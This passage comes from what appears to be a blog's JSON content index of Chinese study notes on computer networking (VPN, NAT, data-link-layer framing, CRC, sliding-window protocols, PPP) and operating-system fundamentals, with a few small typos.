Network)**\n\n**利用公用的因特网**作为本机构各专用网之间的通信载体，这样的专用网又称为**虚拟专用网**。\n\n同一机构内不同部门的内部网络所构成的虚拟专用网VPN又称为**内联网VPN**\n\n有时一个机构的VPN需要有某些外部机构(通常就是合作伙伴)参加进来。这样的VPN就称为**外联网VPN**。\n\n在外地工作的员工需要访问公司内部的专用网络时，只要在任何地点接入到因特网，运行驻留在员工PC中的VPN软件，在员工的PC和公司的主机之间建立VPN隧道，即可访问专用网络中的资源。这种VPN称为**远程接入VPN**。\n\n---\n\n由于IPv4地址的紧缺，一个机构能够申请到的IPv4地址数量往往远小于本机构所拥有的主机数量。因此，**虚拟专用网中的各主机所分配的地址应该是本机构可自由分配的专用地址**，而不是需要申请的、在因特网上使用的公有地址。\n\n因特网数字分配机构IANA划分了IPv4地址空间中特殊地址，其中有部分地址是无需申请的、可自由分配的专用地址，或称私有地址\n\n- **10.0.0.0~10.255.255.255(10/8地址块)**\n- **172.16.0.0~172.31.255.255(172.16/12地址块)**\n- **192.168.0.0~192.168.255.255(192.168/16地址块)**\n\n> 注：私有地址只能用于一个机构的内部通信，而不能用于和因特网上的主机通信；\n私有地址只能用作本地地址而不能用作全球地址；\n因特网中所有路由器对目的地址是私有地址的IP数据报一律不进行转发。\n\n所以部门A和部门B至少需要一个 路由器具有合法的全球IP地址，这样各自的专用网才能利用公用的因特网进行通信\n\n举例说明：部门A向部门B发送数据流程\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(19).png)\n\n两个专用网内的主机间发送的数据报是通过了公用的因特网，但在效果上就好像是在本机构的专用网上传送一样\n\n数据报在因特网中可能要经过多个网络和路由器，但从逻辑上看，R1和R2之间好像是一条直通的点对点链路，因此也被称为IP隧道技术。\n\n## 网络地址转换NAT\n\n**NAT(Network Address Translation)**\n\n虽然因特网采用了无分类编址方式来减缓IPv4地址空间耗尽的速度，但由于因特网用户数目的激增，特别是大量小型办公室网络和家庭网络接入因特网的需求不断增加，IPv4地址空间即将面临耗尽的危险仍然没有被解除。\n\n1994年提出了一种网络地址转换NAT的方法再次**缓解了IPv4地址空间即将耗尽的问题**。\n\nNAT能使大量**使用内部专用地址的专用网络用户共享少量外部全球地址**来访问因特网上的主机和资源。\n\n---\n\n使用私有地址的主机，如何才能与因特网上使用全球IP地址的主机进行通信？\n\n- 这需要在专用网络连接到因特网的路由器上安装NAT软件\n\n装有NAT软件的路由器叫做NAT路由器，它至少有一个有效的外部全球IP地址。\n\n这样，所有使用私有地址的主机在和外界通信时，都要在NAT路由器上将其私有地址转换为全球IP地址\n\n---\n\n假设，使用私有地址的主机要给因特网上使用全球IP地址的另一台主机发送IP数据报\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(20).png)\n\n因特网上的这台主机给源主机发回数据报\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211105(21).png)\n\n那么问题来了，如果NAT路由器有N各全球IP地址，那最多也就只有N个内网主机可以同时和因特网上的主机通信。\n\n如何解决：由于绝大多数的网络应用都是使用运输层协议TCP或UDP来传送数据，因此可以利用运输层的端口号和IP地址一起进行转换。\n这样，**用一个全球IP地址就可以使多个拥有本地地址的主机同时和因特网上的主机进行通信**。这种将端口号和IP地址起进行转换的技术叫作**网络地址与端口号转换NAPT(Network Address and Port Translation)**。\n\n> 我们现在用的很多家用路由器都是这种NART路由器\n\n对于一些P2P网络应用， 需要**外网主机主动与内网主机进行通信，在通过NAT时会遇到问题**，需要网络应用自己使用一些特殊的NAT穿越技术来解决问题。\n\n- 因为外网主机不能首先发起与内网主机的通信，内网中没有对应表项\n\n由于**NAT对外网屏蔽了内网主机的网络地址**，能为内网的主机提供一定的安全保护。","tags":["计算机网络"],"categories":["计算机网络"]},{"title":"操作系统-第一章-概述","url":"/2021/11/01/操作系统-第一章-概述/","content":"\n# 操作系统的概念、功能和目标\n\n## 概念\n\n操作系统(Operating System，OS)是指 控制和**管理**整个计算机系统的**硬件和软件**资源，并合理地组织调度计算机的工作和资源的分配，**为用户和其他软件提供方便的接口和环境** 的程序集合。它是计算机系统中最基本的**系统软件**。\n\n<!-- more -->\n\n## 功能和目标\n\n①操作系统是系统资源的管理者\n\n②向上提供方便易用的服务\n\n③是最接近硬件的一层软件\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211101(1).png\" width=\"67%\" />\n\n---\n\n**①操作系统是系统资源的管理者（管理功能）**\n\n作为系统资源的管理者，其目标是安全、高效，提供的功能有：\n\n- 处理机管理\n    - 管理处理机的分配与运行，解决冲突问题，可以理解为对进程的管理\n    - 进程管理：进程控制、进程同步、进程通信、死锁处理、处理机调度\n- 存储器管理\n    - 为了提高多道程序运行效率，方便用户使用\n    - 内存分配、地址映射、内存保护、共享和内存扩充\n- 文件管理\n    - 操作系统负责管理文件的系统称为文件系统\n    - 文件存储空间的管理、目录管理、文件读写管理和保护\n- 设备管理\n    - 完成用户的IO请求，方便用户使用设备，提高设备的利用率\n    - 缓冲管理、设备分配、设备处理、虚拟设备\n\n---\n\n**②向上提供方便易用的服务（接口功能）**\n\n操作系统为用户和软件提供服务，通过提供接口来完成：\n\n- 命令接口\n    - 联机控制方式：交互式命令接口，适用于分时或者实时系统，就像人与机器对话一样。(用户说一句，系统跟着做一句)\n    - 脱机控制方式：批处理命令接口，提交一组作业，系统进行处理，用户不能干预作业的运行。(用户说一堆，系统跟着做一堆)\n- 程序接口\n    - 由一组系统调用命令组成(也称作**系统调用**或者**广义指令**)\n    - 可以在程序中进行**系统调用**来使用程序接口。普通用户不能直接使用程序接口，只能通过程序代码间接使用。\n\n此外还有GUI图形用户界面，可以说 命令接口和GUI是直接给用户使用的，而程序接口是给软件或是程序员使用的。\n\n---\n\n**③是最接近硬件的一层软件（扩充机器）**\n\n作为最接近硬件的一层软件，操作系统需要实现**对硬件机器的扩展**，将CPU、内存、磁盘、显示器、键盘等硬件合理地组织起来，让各种硬件能够相互协调配合，实现更多更复杂的功能。\n\n- 通常把覆盖了软件的机器成为扩充机器，又称之为虚拟机\n\n---\n\n# 操作系统的特征\n\n> 四个基本特征：**并发**、**共享**、虚拟、异步\n\n## 并发\n\n> 并发：指两个或者多个事件在同一时间间隔内发生。\n并行：指两个或者多个事件在同一时刻同时发生。\n- 并发使得系统具有处理和调度多个程序同时执行的能力\n- 操作系统的并发是通过分时实现的\n\n> 操作系统就是伴随着“多道程序技术”出现而出现的。因此，操作系统和程序并发是一起诞生的。\n\n重要考点：\n\n- 单核CPU同一时刻只能执行一个程序，各个程序只能**并发**地执行\n    - 对于单处理机来说，宏观上程序是并发的，微观上程序是交替执行的\n- 多核CPU同一时刻可以同时执行多个程序，多个程序可以**并行**地执行\n\n## 共享\n\n> 共享：即资源共享，是指系统中的资源可供内存中多个并发执行的进程共同使用。\n\n有两种资源共享方式：\n\n- 互斥共享方式\n    - 一个时间段只允许一个进程对资源进行访问，例如打印机，磁带\n    - 这种资源称作：**临界资源**或者独占资源\n- 同时访问方式\n    - 一个时间段内允许多个进程对资源进行访问，例如磁盘资源\n\n**并发和共享的关系(**互为存在条件**)**\n\n并发性指计算机系统中同时存在着多个运行着的程序。\n\n共享性是指系统中的资源可供内存中多个并发执行的进程共同使用。\n\n如果失去并发性，则系统中只有一个程序正在运行，则共享性失去存在的意义；\n\n如果失去共享性，则两个程序不能同时访问硬盘资源，就无法实现同时发送文件，也就无法并发。\n\n## 虚拟\n\n> 虚拟：指把一个物理上的实体变为若干个逻辑上的对应物。物理实体是实际存在的，而逻辑上对应物是用户感受到的。\n\n一个物理上的实体变为若干逻辑上的对应物，这种技术也被称为虚拟技术，可分为：\n\n- 时分复用技术\n    - 如虚拟处理器：采用多道程序并发的方式，让每个终端用户感觉到有多个处理器\n- 空分复用技术\n    - 如虚拟存储器：将物理存储变为虚拟存储器，逻辑上扩充存储器用\n\n**并发和虚拟的关系**\n\n如果失去了并发性，则一个时间段内系统中只需运行一道程序，那么就失去了实现虚拟性的意义了。因此，没有并发性，就谈不上虚拟性。\n\n## 异步\n\n> 异步：在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，多道程序走走停停，进程以不可预知的速度向前进\n\n**并发和异步的关系**\n\n只有系统拥有并发性，才有可能导致异步性。\n\n---\n\n小结：并发和共享互为存在条件，没有并发和共享，就谈不上虚拟和异步，因此**并发**和**共享**是操作系统的两个最基本的特征\n\n---\n\n# 操作系统的发展与分类\n\n---\n\n1. **手工操作阶段**\n\n程序的装入、运行、结果的输出都需要人为的干预\n\n缺点：资源利用率低、CPU利用不充分、**人机速度矛盾**\n\n---\n\n1. **批处理阶段**\n\n> 为了解决人机矛盾以及CPU和I/O设备之间速度不匹配的矛盾\n\n**单道批处理系统**(引入脱机输入输出技术)\n\n内存中始终保存一道作业，作业成批进行\n\n特点：\n\n- 自动性：一批作业自动执行不需要人工干预\n- 顺序性：各道作业依次执行\n- 单道性：仅有一道程序执行\n\n优点：\n\n**缓解**了一定程度的**人机速度矛盾**，资源利用率有所提升\n\n缺点：\n\n- 高速CPU等待I/O设备的完成，**资源利用率依然很低**\n- 内存中仅能有一道程序运行，只有该程序运行结束之后才能调入下一道程序\n\n**多道批处理系统**(操作系统开始出现)\n\n> 多道批处理系统的产生标志着操作系统正式诞生。\n\n允许多个程序在CPU中交替运行，程序共享各种硬件和软件资源。\n\n特点：\n\n- 多道：计算机中同时存放多道相互独立的程序\n- 宏观上并行：多道程序都会开始运行，但都没有运行完毕\n- 微观上串行：多道程序轮流占有CPU，交替执行\n\n优点：\n\n- **资源利用率高**\n- **多道程序并发执行**，共享计算机资源\n- CPU和其他资源更能保持“忙碌”状态，系统吞吐量增大\n\n缺点：\n\n- 设计复杂，要考虑各种资源调度问题\n- 响应时间过长，**没有人机交互功能**\n\n---\n\n1. **分时操作系统**\n\n计算机以**时间片**为单位**轮流为各个用户/作业服务**，各个用户可通过终端与计算机进行交互。\n主要优点：\n\n- 用户请求可以被即时响应，解决了**人机交互问题**；\n- 允许多个终端用户同时使用一台计算机，并且用户对计算机的操作相互独立，互不干扰。\n\n主要缺点：\n\n- **不能优先处理一些紧急任务**；\n- 操作系统对各个用户/作业都是完全公平的，循环地为每个用户/作业服务一个时间片，不区分任务的紧急性。\n\n---\n\n1. **实时操作系统**\n\n保证在规定时间内完成某项任务。\n\n主要优点：**能够优先响应一些紧急任务**，某些紧急任务不需时间片排队。\n\n硬实时系统：必须在绝对严格的规定时间内完成处理，如导弹控制，自动驾驶\n\n软实时系统：能接受偶尔违反时间规定，如12306订票\n\n主要特点是及时性和可靠性。\n\n---\n\n其他几种操作系统\n\n- 网络操作系统：是伴随着计算机网络的发展而诞生的，能把网络中各个计算机有机地结合起来，实现数据传送等功能，实现网络中各种资源的共享（如文件共享）和各台计算机之间的通信。（如：Windows NT 就是一种典型的网络操作系统，网站服务器就可以使用）\n- 分布式操作系统：主要特点是分布性和并行性。系统中的任意两台计算机之间没有主从之分，相互交换信息，并行工作、协同完成任务。\n- 个人计算机操作系统：如Windows XP、MacOS，方便个人使用，广泛应用于文字处理、电子表格、游戏等。\n\n---\n\n# 操作系统的运行机制\n\n两种指令：\n\n指令就是处理器CPU能识别、执行的最基本命令，指二进制机器指令。\n\n- 特权指令：如内存清零指令\n- 非特权指令：如普通的运算指令\n\n两种程序：\n\n- 应用程序\n    - 用户自编的程序\n    - 为了保证系统能安全运行，普通应用程序只能执行非特权指令，运行在用户态\n- 内核程序\n    - 很多内核程序组成了操作系统内核，简称内核Kernel\n    - 是系统的管理者，可以执行特权指令和非特权指令，运行在核心态\n\n两种处理器状态：核心态(内核态)和用户态\n\n- 处于内核态时，说明此时正在运行的是内核程序，此时可以执行特权指令\n- 处于用户态时，说明此时正在运行的是应用程序，此时只能执行非特权指令\n\n状态切换：\n\n内核态→用户态：执行修改程序状态字寄存器PSW的特权指令\n\n内核态→用户态：由中断引起，硬件自动完成\n\n---\n\n**内核**\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211101(2).png\" width=\"80%\" />\n\n时钟管理：操作系统对用户提供标准时间，根据时钟对进程进行管理，实现进程切换。\n\n中断机制：初衷是为了提高多道程序运行环境中的CPU利用率，保护和恢复中断现场的信息，转移控制权到相关程序。\n\n原语：处于系统的最底层，是最接近硬件的部分，运行具有原子性，即只能一气呵成，运行时间短、调用频繁。\n\n<img src=\"https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211101(3).png\" width=\"80%\" />\n\n大内核：\n\n- 将操作系统的主要功能模块都作为系统内核，运行在核心态\n- 优点：各个管理模块之间共享信息，能够有效利用相互之间的有效特效，有性能优势\n- 缺点：内核代码庞大，层次交互关系复杂，层次接口难以定义，难以维护\n\n微内核：\n\n- 只把最基本的功能保留在内核\n- 优点：内核功能少，有效的分离内核与服务、服务与服务，结构清晰，方便维护\n- 缺点：需要频繁地在核心态和用户态之间切换，性能低\n\n---\n\n# 中断和异常\n\n为了进行核心态和用户态的切换，引入了中断机制。\n\n中断是让操作系统内核夺回CPU使用权的唯一途径。\n\n内中断(异常)：\n\n- trap、fault、abort\n- 与当前执行的指令有关，中断信号来源于CPU内部\n- 异常不能被屏蔽\n\n外中断(中断)：\n\n- 时钟中断、I/O中断请求\n- 与当前执行的指令无关，中断信号来源于CPU外部\n\n基本实现原理：\n\n- 检查中断信号\n    - 内中断：CPU在**执行指令时**会检查是否有异常发生\n    - 外中断：在**每个指令周期末尾**，CPU都会检查是否有外中断信号需要处理\n- 找中断处理程序\n    - 不同的中断信号，需要用不同的中断处理程序来处理。\n    - 当CPU检测到中断信号后，会根据中断信号的类型去查询“中断向量表”，以此来找到相应的中断处理程序在内存中的存放位置。\n\n# 系统调用\n\n操作系统作为用户和计算机硬件之间的接口，需要向上提供一些简单易用的服务。主要包括命令接口和程序接口。其中，程序接口由一组系统调用组成。\n\n“系统调用”是操作系统提供给应用程序（程序员/编程人员）使用的接口，可以理解为一种可供应用程序调用的特殊函数，**应用程序可以通过系统调用来请求获得操作系统内核的服务。**\n\n系统调用按功能可分为：\n\n- 设备管理：完成设备的请求/释放/启动等功能\n- 文件管理：完成文件的读/写/创建/删除等功能\n- 进程控制：完成进程的创建/撤销/阻塞/唤醒等功能\n- 进程通信：完成进程之间的消息传递/信号传递等功能\n- 内存管理：完成内存的分配/回收等功能","tags":["操作系统"],"categories":["操作系统"]},{"title":"计算机网络-第三章-数据链路层","url":"/2021/10/31/计算机网络-第三章-数据链路层/","content":"\n#  概述\n\n**链路(Link)：**是从一个结点到相邻结点的一段物理线路，中间没用任何其他的交换结点。\n\n**数据链路(Data Link)：**把实现通信协议的**硬件**和**软件**加到链路上，就构成了数据链路。\n\n**数据链路层以帧为单位传输和处理数据。**\n\n<!-- more -->\n数据链路层使用的信道主要有以下两种类型：\n\n- 点对点信道\n    - 这种信道使用一对一的点对点通信方式。\n- 广播信道\n    - 使用一对多的广播通信方式\n    - 因此必须使用专用的共享信道协议来协调这些主机的数据发送。\n\n注：不同数据链路层可能采用不同的数据链路层协议。\n\n> **局域网属于数据链路层**\n局域网虽然是个网络，但在同一个局域网中，分组怎么从一台主机传送到另一台主机，并不经过路由器转发。\n从整个互联网来看，**局域网仍属于数据链路层**的范围。\n\n# 封装成帧\n\n封装成帧是指数据链路层将上层交付的协议数据单元**添加帧头和帧尾**使之成为帧。\n\n**帧头和帧尾中包含有重要的控制信息**\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(1).png)\n\n---\n\n> 问题来了，封装成帧后还要将数据由比特转为电信号提高传输媒体传输，接收方如何从物理层得到的比特流中提取出一个个的帧呢？\n\n方法一：数据链路层使用帧头帧尾实现**帧定界**，如PPP帧\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(2).png)\n\n---\n\n方法二：物理层加**前导码**，如以太网\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(3).png)\n\n帧到物理层以后，物理层为其添加前导码(包括 前同步码 和 帧开始定界符)\n\n- 前同步码：作用是使接收方的时钟同步；\n- 帧开始定界符：表明后面紧跟着的就是MAC帧\n\n另外以太网还规定了帧间间隔为96比特时间，因此，MAC帧不需要帧结束定界符\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(4).png)\n\n---\n\n我们希望数据链路层能实现透明传输，所谓透明传输，就是指**数据链路层对上层交付的传输数据没有任何限制**，好像数据链路层不存在一样。\n\n> 问题来了，之前说到的帧定界符其实就是一个特定的比特串，如果在上层交付的PDU中，恰好也包含这个特定数值，那不就没法正确定界了吗。\n\n这样一来，数据链路层对上层交付的PDU就由限制，也就不能实现透明传输。\n\n解决方法：\n\n- 面向字节的物理链路使用**字节填充** (byte stuffing) 或**字符填充** (character stuffing)；\n    - 发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面**插入一个转义字符“ESC”**(其十六进制编码是1B)；\n    - 接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。\n    - 如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。当接收端收到连续的两个转义字符时，就删除其中前面的一个。\n- 面向比特的物理链路使用**比特填充**的方法实现透明传输；\n    - 在帧的数据部分，每遇到5个连续的比特1就在其后插入一个0，这样就不会和帧定界符01111110重复了，接收方收到后每5个1去掉后面的0即可\n\n---\n\n为了提高帧的传输速率，应当使帧的数据部分的长度尽可能大些。\n\n但是考虑到差错控制等多种因素，每一种数据链路层协议都规定了**帧的数据部分**长度上限，即 最大传送单元MTU(Maximum Transfer Unit)\n\n# 差错控制技术\n\n> 实际的通信链路都不是理想的，比特在传输过程中可能会产生差错：1可能会变成0，而0也可能变成1。这称为**比特差错**。\n在一段时间内，传输错误的比特占所传输比特总数的比率称为**误码率BER**(Bit Error Rate)。\n\n使用**差错检测码**来检测数据在传输过程中是否产生了比特差错,是数据链路层所要解决的重要问题之一。\n\n下面介绍几种常用的差错检测码\n\n## 奇偶校验码\n\n在待发送的数据后面添加1位奇偶校验位，使整个数据(包括所添加的校验位在内)中**“1\"的个数**为 奇数(奇校验) 或 偶数(偶校验)。\n\n- 如果有**奇数个**位发生误码，则奇偶性发生变化，**可以检查出误码**；\n- 如果有**偶数个**位发生误码，则奇偶性不发生变化，**不能检查出误码(漏检)** ;\n\n## 循环冗余校验码CRC\n\n**循环冗余校验CRC(Cyclic Redundancy Check)**\n\n- 收发双方约定好一个生成多项式G(x)；\n- 发送方基于待发送的数据 和 生成多项式 计算出 差错检测码(**冗余码**)，将其添加到待传输数据的后面一起传输；\n- 接收方通过生成多项式来计算收到的数据是否产生了误码。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(5).png)\n\n计算CRC步骤：\n\n1. 构造被除数：在待发送数据后面添加**生成多项式最高次**个0\n2. 构造除数：生成多项式各项系数构成的比特串\n3. 做除法\n4. 检查余数：余数的位数应该与生成多项式最高次相同，若不同则在前补0凑足位数。\n5. 将余数加到待发数据之后\n\n验证CRC步骤：\n\n1. 构造被除数：接收到的数据就是被除数\n2. 构造除数：生成多项式各项系数构成的比特串\n3. 做除法\n4. 检查余数：余数为0，可认为传输过程无误码；否则可认为传输过程产生误码\n\n---\n\n**小结：**\n\n- **检错码**只能检测出帧在传输过程中出现了差错，但并不能定位错误，因此**无法纠正错误**；\n- 要想纠正传输中的差错，可以使用冗余信息更多的**纠错码**进行**前向纠错**。但纠错码的开销比较大，在计算机网络中较少使用；\n- 循环冗余校验**CRC**有很好的检错能力(**漏检率非常低**)，虽然计算比较复杂，但非常**易于硬件实现**，因此被**广泛应用于数据链路层**；\n    - 帧校验序列FCS便是添加在数据后面的冗余码\n- 在计算机网络中通常采用**检错重传方式**来纠正传输中的差错，或者**仅仅是丢弃检测到差错的帧**，这取决于数据链路层向其上层提供的是可靠传输服务还是不可靠传输服务。\n\n# 可靠传输\n\n- 使用**差错检测技术**(例如循环冗余校验CRC)，接收方的数据链路层就可检测出帧在传输过程中是否产生了误码(比特错误)\n- 数据链路层向上层提供的服务类型：\n    - 不可靠传输服务：**仅仅丢弃有误码的帧**，其他什么也不做；\n    - 可靠传输服务：想办法实现**发送端发送什么，接收端就收到什么**。\n\n> 一般情况下，**有线链路**的误码率比较低，为了减小开销，并**不要求**数据链路层向上提供**可靠**传输服务。即使出现了误码，可靠传输的问题可由其上层处理。\n\n> 而无线链路易受干扰，误码率比较高，因此要求数据链路层必须向上层提供可靠传输服务。\n\n扩展：\n\n之前讨论的差错是比特差错，其实比特差错只是传输差错的一种，传输差错还包括**分组丢失**、**分组失序**、**分组重复**。\n\n- 分组丢失：路由器输入队列快满了，主动丢弃收到的分组\n- 分组失序：数据并未按照发送顺序依次到达接收端\n- 分组重复：由于某些原因，有些分组在网络中滞留了，没有及时到达接收端，这可能会造成发送端对该分组的重发，重发的分组到达接收端，但一段时间后，滞留在网络的分组也到达了接收端，这就造成**分组重复**的传输差错\n\n分组丢失、分组失序以及分组重复这些传输差错，一般不会出现在数据链路层，而会出现在其上层。\n\n因此**可靠传输服务并不仅局限于数据链路层**，其他各层均可选择实现可靠传输。由于可靠传输的实现比较复杂，开销也比较大，是否使用还是要取决于应用需求。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(6).png)\n\n为实现可靠传输，下面介绍三种可靠传输协议\n\n- 停止-等待协议SW\n- 回退N帧协议GBN\n- 选择重传协议SR\n\n注：这三种可靠传输实现机制的基本原理并不仅限于数据链路层，可以应用到计算机网络体系结构的各层协议中。\n\n## 停止-等待协议\n\n所谓停止-等待，就是发送方发送数据后需等到接收方的回应后才继续发送数据。\n\n- 接收端检测到数据分组有误码时，将其丢弃并等待发送方的**超时重传**。\n    - **一般可将重传时间选为略大于 从发送方到接收方的平均往返时间；**\n    - 但对于误码率较高的点对点链路，为使发送方**尽早重传**，也可**给发送方发送NAK分组**。\n- 为了让接收方能够判断所收到的数据分组是否是重复的，需要给**数据分组编号**。\n    - 由于停止-等待协议的停等特性,只需1个比特编号就够了，即编号0和1\n- 为了让发送方能够判断所收到的ACK分组是否是重复的，需要给**ACK分组编号**，所用比特数量与数据分组编号所用比特数量一样。\n    - 数据链路层一般不会出现ACK分组迟到的情况，因此在数据链路层实现停止等待协议可以不用给ACK分组编号。\n\n---\n\n**停止-等待协议的信道利用率**\n\n假设收发双方之间是一条直通的信道\n\n- **TD**：是发送方发送数据分组所耗费的发送时延\n- **RTT**：是收发双方之间的往返时间\n- **TA**：是接收方发送确认分组所耗费的发送时延\n- 信道利用率 U=TD/(TD+RTT+TA)\n\nTA一般都远小于TD，可以忽略。\n\n当RTT远大于TD时(如卫星链路)，信道利用率会非常低。\n\n若出现重传，则对于传送有用的数据信息来说，信道利用率还要降低。\n\n为了克服停止-等待协议信道利用率很低的缺点，就产生了另外两种协议，即后退N帧协议GBN和选择重传协议SR。\n\n> 像停止-等待协议这样通过**确认和重传机制**实现的可靠传输协议，常称为**自动请求重传协议ARQ**(**A**utomatic **R**epeat re**Q**uest)，意思是重传的请求是自动进行的，不需要接收方显式地请求发送方重传某个发送的分组\n\n## 回退N帧协议GBN\n\n**为什么用回退N帧协议：**在相同的时间内，使用停止-等待协议的发送方只能发送一个数据分组，而采用流水线传输的发送方，可以发送多个数据分组，采用流水线传输可**提高信道利用率。**\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(7).png)\n\n回退N帧协议在流水线传输的基础上，利用**发送窗口**来限制发送方可连续发送数据分组的个数。\n\n- 若采用n比特给分组编号，即有序号0~2^n-1；\n- 发送窗口的尺寸WT的取值：1<WT≤2^n-1；\n- 接收窗口的尺寸**WR=1**.\n\n---\n\n举例说明：\n\n用3比特给分组编号，WT=5，WR=1。\n\n**无差错情况流程：**\n\n1. 发送方将序号落在发送窗口内的0~4号数据分组，依次连续发送出去；\n2. 数据分组经过互联网传输正确到达接收方，也就是没有乱序和误码，接收方按序接收它们，每接收一个，接收窗口就向前滑动一个位置，并给发送方发送针对所接收分组的确认分组，在通过互联网的传输正确到达发送方；\n3. 发送方每接收一个、发送窗口就向前滑动一个位置，这样就有新的序号落入发送窗口，发送方可以将收到确认的数据分组从缓存中删除了，而接收方可以择机将已接收的数据分组交付上层处理。\n\n> 接收方不一定要对收到的数据分组逐个发送确认，而是可以在收到几个数据分组后(由具体实现决定)，对按序到达的最后一个数据分组发送确认。ACKn表示序号为n及以前的所有数据分组都已正确接收。\n\n这种方法称为 **累计确认**\n\n其优点在于：\n\n- 即使部分确认分组丢失，发送方也可能不必重传\n- 减小接收方的开销\n- 减小对网络资源的占用\n\n其缺点在于：\n\n- 不能向发送方**及时反映**出接收方已经正确接收的数据分组信息\n\n---\n\n经过之前的无差错传输，现在发送窗口起始位置在5号位置\n\n**有差错情况流程：**\n\n1. 在传输数据分组时，5号数据分组出现误码，接收方通过数据分组中的检错码发现了错误；\n2. 于是丢弃该分组，而后续到达的剩下四个分组与接收窗口的序号不匹配；\n3. 接收方同样也不能接收它们，将它们丢弃，并对之前按序接收的最后一个数据分组进行确认，发送ACK4，**每丢弃一个数据分组，就发送一个ACK4；**\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/20211031(8).png)\n\n1. 当接收方收到重复的ACK4时，它就知道之前所发送的数据分组出现了差错；\n    - 于是可以不等超时计时器超时就立刻开始重传 (至于具体收到几个重复确认就立刻重传，根据具体实现决定)\n    - 如果收到这4个重复的确认并不会触发发送立刻重传，一段时间后，超时计时器超时，也会将发送窗口内以发送过的这些数据分组全部重传\n\n---\n\n思考：\n\n为什么WT不能超过2^n-1，如果超过会是什么情况？\n\n- 还是按之前的例子来，假如发送窗口为8，即一次发送了0~7数据分组，接收方收到后要发送确认ACK7，但是由于某些原因ACK7丢失了，那么发送方待计时器超时后就会重传0~7数据分组，而此时接收窗口以及来到了第二个0号，接收方依然会将其看作新的数据分组接收下来，这就导致了数据重复接收。\n- 可见发送窗口超过2^n-1会导致接收方无法分辨新、旧数据分组。\n\n---\n\n小结：\n\n- 回退N帧协议在流水线传输的基础上利用发送窗口来限制发送方连续发送数据分组的数量，是一种连续ARQ协议；\n- 在协议的工作过程中发送窗口和接收窗口不断向前滑动，因此这类协议又称为滑动窗口协议；\n- 由于回退N帧协议的特性，当通信线路质量不好时，其信道利用率并不比停止-等待协议高\n\n对于发送方：\n\n- 发送方可在未收到接收方确认分组的情况下，将序号落在发送窗口内的多个数据分组全部发送出去；\n- 发送方只有收到对已发送数据分组的确认时，发送窗口才能向前相应滑动；\n- 发送方收到多个重复确认时，可在重传计时器超时前尽早开始重传，由具体实现决定；\n- 发送方发送窗口内某个已发送的数据分组产生超时重发时，其后续在发送窗口内且已发送的数据分组也必须**全部重传**，这就是回退N帧协议名称的由来。\n\n对于接收方：\n\n- 接收方只接收序号落在接收窗口内且无误码的数据分组，并且将接收窗口向前滑动一个位置，与此同时给发送方发回相应的确认分组。\n- 为了减少开销，接收方不一定每收到一个按序到达且无误码的数据分组就给发送方发回一个确认分组。\n- 接收方收到未按序到达的数据分组，除丢弃外，还要对**最近按序接收的数据分组进行确认**;\n\n## 选择重传协议SR\n\n> 回退N帧协议的接收窗口尺寸WR只能等于1，因此接收方只能按序接收正确到达的数据分组。\n一个数据分组的误码就会导致其后续多个数据分组不能被接收方按序接收而丢弃(尽管它们无乱序和误码)。这必然会造成发送方对这些数据分组的超时重传，显然这是对通信资源的极大浪费。\n\n为了进一步提高性能，可设法只重传出现误码的数据分组。因此，接收窗口的尺寸**WR不应再等于1 (而应大于1)** ，以便接收方**先收下失序到达但无误码并且序号落在接收窗口内的那些数据分组**，等到所缺分组收齐后再一并送交上层。这就是选择重传协议。\n\n注意：\n选择重传协议为了使发送方仅重传出现差错的分组，接收方不能再采用累计确认，而需要对每个正确接收到的数据分组进行逐一确认！\n\n---\n\n小结：\n\n若采用n比特给分组编号，即有序号0~2^n-1；\n\n对于发送方：\n\n- 发送窗口的尺寸WT的取值：1<WT≤2^n-1；\n    - 若WT=1，则与停止-等待协议相同\n    - 若WT>2^n-1，接收方无法分辨新、旧数据分组\n- 发送方可在未收到接收方确认分组的情况下，将序号落在发送窗口内的多个数据分组全部发送出去;\n- 发送方只有**按序**收到对已发送数据分组的确认时，发送窗口才能向前相应**滑动**；\n- 若收到**未按序**到达的确认分组时，对其**进行记录**，以防止其相应数据分组的超时重发，但发送窗口不能向前滑动。\n\n对于接收方：\n\n- 接收窗口的尺寸WR的取值：**1<WR≤WT**\n    - WR=1，则与停止-等待协议相同\n    - 若WR>WT，则没有意义，接收窗口太大没用\n- 接收方**可接收未按序到达**但没有误码并且序号落在接收窗口内的数据分组；\n- 接收方只有在按序接收数据分组后，接收窗口才能向前相应滑动。\n\n# 点对点协议PPP\n\n- 点对点协议PPP（Point-to-Point Protocol）是目前使用最广泛的点对点数据链路层协议。\n- PPP协议是因特网工程任务组IEIF在1992年制定的。经过1993年和1994年的修订，现在的PPP协议已成为因特网的正式标准[RFC1661，RFC1662]\n- PPP是数据链路层使用的一种协议，它的特点是：简单；只检测差错，而不是纠正差错；不使用序号，也不进行流量控制；可同时支持多种网络层协议。\n- PPPoE 是为宽带上网的主机使用的链路层协议\n\n---\n\nPPP协议为在点对点链路传输各种协议数据报提供了一个标准方法，主要由以下三部分构成：\n\n- 一套网络控制协议NCPs：其中的每一个协议支持不同的网络层协议\n- 封装成帧：对各种协议数据报的封装方法\n- 链路控制协议LCP：用于建立、配置以及测试数据链路的连接\n\n## 